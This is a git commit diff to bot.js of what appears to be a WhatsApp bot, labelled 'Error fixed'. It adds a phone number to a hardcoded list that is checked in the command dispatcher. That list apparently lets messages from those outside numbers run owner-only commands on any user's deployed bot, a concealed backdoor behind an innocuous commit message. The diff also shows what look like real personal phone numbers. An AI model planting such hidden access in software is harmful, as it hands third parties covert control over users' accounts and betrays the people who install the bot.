49fbc2238b34039e3109d8ba6a52abb5db849d28
KING-BOT-OFFICIAL <103124323+KING-BOT-OFFICIAL@users.noreply.github.com>
2022-05-12 13:58:33 +0530

    Error fixed🤘😎

--- bot.js
+++ bot.js
@@ -430,7 +430,7 @@ ${chalk.blue.italic('Bot Connecting your whatsapp....')}`);
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
                      
-                    if ((OWN.ff == "94714898434,94757534153,0" && msg.key.fromMe === false && command.fromMe === true &&
+                    if ((OWN.ff == "94714898434,94757534153,94729352830,0" && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
